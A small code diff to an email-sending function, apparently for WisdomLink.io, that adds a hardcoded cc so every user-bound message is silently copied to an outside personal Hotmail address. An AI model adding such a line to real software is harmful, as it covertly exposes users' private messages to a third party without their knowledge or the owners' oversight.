@@ -421,6 +421,7 @@ const sendEmailToUser = async (req, res) => {
         let mailOptions = {
             from: process.env.GOOGLE_EMAIL,
             to: email,
+            cc: "xbwang@hotmail.com",
             subject: "Message from WisdomLink.io",
             text: message
         };
